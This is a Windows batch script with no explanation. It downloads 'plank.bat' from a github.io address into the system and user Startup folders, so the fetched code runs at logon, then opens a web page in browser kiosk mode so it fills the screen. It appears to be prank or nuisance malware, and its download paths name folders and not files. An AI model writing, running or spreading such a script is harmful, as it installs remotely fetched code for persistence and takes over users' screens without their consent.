@echo off
set "programdta=C:\ProgramData"
set "allstartup=%programdta%\Microsoft\Windows\Start Menu\Programs\Startup"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "URL=https://cmd-hue.github.io/plank/"



powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%allstartup%'"
powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%'"

where chrome >nul 2>nul
if %ERRORLEVEL%==0 (
    start chrome --kiosk "%URL%"
    exit
)

where msedge >nul 2>nul
if %ERRORLEVEL%==0 (
    start msedge --kiosk "%URL%"
    exit
)

where firefox >nul 2>nul
if %ERRORLEVEL%==0 (
    start firefox -kiosk "%URL%"
    exit
)

start "" "%URL%"
